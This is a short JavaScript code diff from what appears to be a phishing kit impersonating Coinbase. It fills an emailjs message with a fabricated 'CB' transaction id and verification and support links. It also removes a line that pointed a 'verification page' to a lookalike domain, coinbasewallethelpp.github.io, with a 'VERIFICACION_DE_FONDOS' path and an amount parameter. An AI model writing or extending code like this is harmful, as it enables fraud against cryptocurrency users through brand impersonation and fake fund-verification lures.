@@ -88,8 +88,7 @@
                     verification_link: verificationLink,
                     support_link: supportLink,
                     privacy_policy: privacyPolicy,
-                    transaction_id: `CB${Date.now()}${Math.floor(Math.random() * 1000)}`,
-                    verification_page_url: `https://coinbasewallethelpp.github.io/VERIFICACION_DE_FONDOS_/?amount=${amount}`
+                    transaction_id: `CB${Date.now()}${Math.floor(Math.random() * 1000)}`
                 };
 
                 emailjs.send('service_8kzc798', 'template_woxom1z', templateParams)
